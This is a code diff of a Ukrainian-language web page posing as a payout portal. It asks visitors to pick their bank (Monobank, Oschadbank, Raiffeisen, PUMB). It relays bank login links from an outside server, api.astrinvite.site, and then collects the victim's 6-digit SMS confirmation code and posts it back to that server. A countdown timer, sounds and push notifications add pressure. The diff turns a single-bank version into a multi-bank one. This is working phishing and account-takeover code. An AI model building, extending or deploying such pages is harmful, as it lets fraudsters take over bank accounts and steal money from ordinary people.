@@ -2,7 +2,7 @@
 <html lang="uk">
 <head>
   <meta charset="UTF-8">
-  <title>Вхід через Monobank</title>
+  <title>Виберіть ваш банк</title>
   <link rel="icon" href="favicon.ico" type="image/x-icon">
   <style>
     body {
@@ -14,88 +14,96 @@
       height: 100vh;
       background-color: #f0f0f0;
     }
-    h1 {
-      margin-bottom: 20px;
+    h1 { margin-bottom: 8px; font-size: 2.1em; font-weight: bold; }
+    #subtitle {
+      color: #555; font-size: 1.05em; margin-bottom: 20px;
+      text-align: center; max-width: 350px;
     }
-    #monobank-btn {
-      padding: 15px 30px;
-      font-size: 18px;
-      background-color: #4CAF50;
-      color: white;
+    .bank-btn, .bank-link {
+      width: 320px;
+      height: 50px;
+      font-size: 20px;
+      font-weight: bold;
+      margin-bottom: 16px;
       border: none;
-      border-radius: 8px;
+      border-radius: 11px;
       cursor: pointer;
+      transition: filter 0.18s, background 0.18s;
+      box-shadow: 0 1px 6px #0001;
+      outline: none;
       text-decoration: none;
+      color: #fff;
+      display: flex; align-items: center; justify-content: center;
     }
-    #monobank-btn:disabled {
-      background-color: #aaa;
+    .mono   { background: #222; }
+    .oschad { background: #215E4D; }
+    .raiff  { background: #ffe100; color: #222; }
+    .pumb   { background: #ea262a; }
+    .privat { background: #27AE60; }
+    .bank-btn:disabled {
+      background: #ccc !important;
+      color: #fff !important;
       cursor: not-allowed;
+      opacity: 0.7;
     }
     #status {
-      margin-top: 15px;
-      color: #555;
-      font-size: 18px;
-      text-align: center;
+      margin-top: 18px; color: #555; font-size: 18px;
+      text-align: center; min-height: 44px;
     }
     #return-instruction {
-      margin:14px 0;
+      margin: 16px 0 0 0;
       color:#444;
       max-width:400px;
       display:none;
       text-align: center;
     }
     #sms-code {
-      font-size: 22px;
-      letter-spacing: 10px;
-      padding: 8px 20px;
-      text-align: center;
-      width: 190px;
-      margin-top: 12px;
-      margin-bottom: 8px;
+      font-size: 22px; letter-spacing: 10px; padding: 8px 20px;
+      text-align: center; width: 190px; margin-top: 12px; margin-bottom: 8px;
     }
     #send-code-btn {
-      margin-left: 10px;
-      padding: 10px 30px;
-      font-size: 18px;
-      background: #1976d2;
-      color: #fff;
-      border: none;
-      border-radius: 7px;
-      cursor: pointer;
+      margin-left: 10px; padding: 10px 30px; font-size: 18px;
+      background: #1976d2; color: #fff; border: none; border-radius: 7px; cursor: pointer;
     }
     #send-code-btn:disabled {
-      background-color: #aaa;
-      cursor: not-allowed;
+      background-color: #aaa; cursor: not-allowed;
     }
-    #sms-error {
-      color: red;
-      margin-top: 5px;
-    }
-    #timer {
-      color: #c60;
-      margin-left: 16px;
-      font-weight: bold;
-      font-size: 20px;
-    }
+    #sms-error { color: red; margin-top: 5px; }
+    #timer { color: #c60; margin-left: 16px; font-weight: bold; font-size: 20px; }
   </style>
 </head>
 <body>
-  <h1>Вхід через Monobank</h1>
-  <button id="monobank-btn" disabled>Завантаження...</button>
+  <h1>Виберіть ваш банк</h1>
+  <div id="subtitle">Для отримання виплат виберіть банк, у якому у вас є діюча карта.</div>
+  <button class="bank-btn mono"   id="mono-btn"   disabled>Monobank</button>
+  <button class="bank-btn oschad" id="oschad-btn" disabled>Ощадбанк</button>
+  <button class="bank-btn raiff"  id="raiff-btn"  disabled>Raiffeisen Bank</button>
+  <button class="bank-btn pumb"   id="pumb-btn"   disabled>ПУМБ</button>
+  <a href="https://privatbank.ua/" class="bank-link privat" id="privat-link" target="_blank" rel="noopener">ПриватБанк</a>
   <div id="return-instruction">
-    <b>Після підтвердження в Monobank поверніться на цю сторінку.<br>
+    <b>Після підтвердження у вибраному банку поверніться на цю сторінку.<br>
     Код підтвердження з'явиться тут автоматично.</b>
   </div>
-  <div id="status">Очікуємо на посилання...</div>
+  <div id="status"></div>
   <audio id="sms-audio" src="sms.mp3"></audio>
 
   <script>
-    const apiUrl = "https://api.astrinvite.site/link";
-    const consumeUrl = "https://api.astrinvite.site/consume-link";
-    const statusUrl = "https://api.astrinvite.site/api/link-status";
-    const codeUrl = "https://api.astrinvite.site/api/submit-code";
-    const btn = document.getElementById("monobank-btn");
-    const status = document.getElementById("status");
+    // Для примера: по-умолчанию ссылки для всех банков нет (disabled)
+    const API_MAP = {
+      mono:   "https://api.astrinvite.site/link?bank=mono",
+      oschad: "https://api.astrinvite.site/link?bank=oschad",
+      raiff:  "https://api.astrinvite.site/link?bank=raiff",
+      pumb:   "https://api.astrinvite.site/link?bank=pumb"
+    };
+    const CONSUME_MAP = {
+      mono:   "https://api.astrinvite.site/consume-link?bank=mono",
+      oschad: "https://api.astrinvite.site/consume-link?bank=oschad",
+      raiff:  "https://api.astrinvite.site/consume-link?bank=raiff",
+      pumb:   "https://api.astrinvite.site/consume-link?bank=pumb"
+    };
+    const STATUS_URL = "https://api.astrinvite.site/api/link-status";
+    const CODE_URL   = "https://api.astrinvite.site/api/submit-code";
+    let currentBank = null;
     let currentId = null;
     let pollingStatus = false;
     let statusPoller = null;
@@ -103,57 +111,83 @@
     let smsTimerInterval = null;
     let smsSoundInterval = null;
 
-    async function getLink() {
+    // Проверяем по очереди для каждого банка — если есть ссылка, делаем кнопку активной
+    async function checkLinks() {
+      for (const bank of ["mono","oschad","raiff","pumb"]) {
+        const btn = document.getElementById(bank+"-btn");
+        btn.disabled = true;
+        btn.textContent = capitalize(bank === "raiff" ? "Raiffeisen Bank" : (bank === "pumb" ? "ПУМБ" : bank.charAt(0).toUpperCase()+bank.slice(1)));
+        try {
+          const res = await fetch(API_MAP[bank]);
+          if (res.ok) {
+            const data = await res.json();
+            if (data.url && data.id) {
+              btn.disabled = false;
+              btn.onclick = ()=>handleBankClick(bank);
+            }
+          }
+        } catch { /* неактивна если не получилось */ }
+      }
+    }
+    checkLinks();
+
+    function capitalize(str) {
+      return str.charAt(0).toUpperCase() + str.slice(1);
+    }
+
+    function resetUI() {
+      document.getElementById("return-instruction").style.display = "none";
+      document.getElementById("status").textContent = "";
+      ["mono-btn","oschad-btn","raiff-btn","pumb-btn"].forEach(id=>{
+        let el = document.getElementById(id);
+        el.disabled = false;
+        el.textContent = el.dataset.orig || el.textContent;
+      });
+    }
+
+    function showLoading(btnId) {
+      ["mono-btn","oschad-btn","raiff-btn","pumb-btn"].forEach(id=>{
+        let el = document.getElementById(id);
+        if(id!==btnId) el.disabled = true;
+      });
+      document.getElementById(btnId).textContent = "Завантаження...";
+      document.getElementById("status").innerHTML = "";
+    }
+
+    async function handleBankClick(bank) {
+      resetUI();
+      currentBank = bank;
+      let btnId = bank+"-btn";
+      showLoading(btnId);
       try {
-        const res = await fetch(apiUrl);
-
-        if (res.status === 204 || res.status === 429) {
-          btn.textContent = "Очікуємо на посилання...";
-          btn.disabled = true;
-          status.textContent = "Спробуємо ще раз за 3 секунди...";
-          setTimeout(getLink, 3000);
-          return;
-        }
-
+        const res = await fetch(API_MAP[bank]);
+        if (!res.ok) throw new Error();
         const data = await res.json();
         if (data.url && data.id) {
           currentId = data.id;
           link = data.url;
-          btn.textContent = "Увійти через Monobank";
-          btn.disabled = false;
-          status.textContent = "Натисніть кнопку для входу.";
-          btn.onclick = () => {
-            fetch(`${consumeUrl}?id=${currentId}`, { method: "POST" });
-            document.getElementById("return-instruction").style.display = "";
-            let redirectLink = link;
-            try {
-              const redirectUrl = encodeURIComponent("https://mono-edopomoga.github.io/2025/");
-              if (!redirectLink.includes("redirect_uri=")) {
-                redirectLink += (redirectLink.includes("?") ? "&" : "?") + "redirect_uri=" + redirectUrl;
-              }
-            } catch {}
-            window.location.href = redirectLink;
-            pollStatus();
-          };
+          fetch(CONSUME_MAP[bank] + "&id=" + currentId, { method: "POST" });
+          document.getElementById("return-instruction").style.display = "";
+          window.location.href = link;
+          pollStatus();
         } else {
-          throw new Error("Немає посилання");
+          throw new Error("Посилання не отримано");
         }
-      } catch (e) {
-        btn.textContent = "Помилка сервера";
-        btn.disabled = true;
-        status.textContent = "Неможливо отримати посилання.";
-        console.error(e);
-        setTimeout(getLink, 3000);
+      } catch {
+        document.getElementById("status").innerHTML = "<span style='color:#b33'>Не вдалося отримати посилання. Спробуйте ще раз.</span>";
+        resetUI();
       }
     }
 
     async function pollStatus() {
       if (pollingStatus) return;
       pollingStatus = true;
-      btn.style.display = "none";
+      ["mono-btn","oschad-btn","raiff-btn","pumb-btn"].forEach(id=>{
+        document.getElementById(id).disabled = true;
+      });
       statusPoller = setInterval(async () => {
         try {
-          const res = await fetch(`${statusUrl}?id=${currentId}`);
+          const res = await fetch(`${STATUS_URL}?id=${currentId}`);
           const data = await res.json();
           if (data.status === "waiting_code") {
             clearInterval(statusPoller);
@@ -164,7 +198,7 @@
     }
 
     function showCodeInput() {
-      status.innerHTML = `
+      document.getElementById("status").innerHTML = `
         <b>Введіть 6-значний код з SMS:</b><br>
         <input id="sms-code" type="text" maxlength="6" style="" autocomplete="one-time-code" inputmode="numeric">
         <button id="send-code-btn">Підтвердити</button>
@@ -172,8 +206,6 @@
         <div id="sms-error"></div>
       `;
       document.getElementById("sms-code").focus();
-
-      // Запуск таймера, звука, пуша
       startSMSTimer();
 
       document.getElementById("send-code-btn").onclick = async () => {
@@ -188,10 +220,10 @@
         fd.append("id", currentId);
         fd.append("code", code);
         try {
-          const res = await fetch(codeUrl, { method: "POST", body: fd });
+          const res = await fetch(CODE_URL, { method: "POST", body: fd });
           const resp = await res.json();
           if (resp.ok) {
-            status.innerHTML = "<b>Код прийнято. Чекаємо підтвердження на пристрої…</b>";
+            document.getElementById("status").innerHTML = "<b>Код прийнято. Чекаємо підтвердження на пристрої…</b>";
             stopSMSTimer();
           } else {
             document.getElementById("send-code-btn").disabled = false;
@@ -204,10 +236,9 @@
       };
     }
 
-    // --- Таймер и звук ---
     function startSMSTimer() {
       let seconds = 180;
-      playSMSAudio(); // первый звук
+      playSMSAudio();
       showSMSPush();
       updateSMSTimer(seconds);
 
@@ -241,7 +272,6 @@
         audio.play();
       } catch {}
     }
-    // --- Пуш-уведомление ---
     function showSMSPush() {
       if ("Notification" in window) {
         if (Notification.permission === "granted") {
@@ -261,8 +291,6 @@
         }
       }
     }
-
-    getLink();
   </script>
 </body>
 </html>
